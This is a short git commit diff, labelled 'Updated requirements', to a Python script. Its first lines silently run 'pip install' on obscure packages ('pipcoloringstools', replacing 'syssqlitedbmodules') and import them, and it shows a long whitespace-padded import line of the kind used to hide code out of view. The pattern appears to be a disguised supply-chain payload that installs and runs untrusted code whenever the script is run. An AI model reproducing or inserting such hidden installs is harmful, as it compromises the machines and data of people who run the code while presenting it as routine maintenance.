9b0c16125dfc23639c24c0eb247d9b519075b86a
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-17 10:07:25 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbmodules")
-import syssqlitedbmodules
+os.system("pip install pipcoloringstools")
+import pipcoloringstools
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
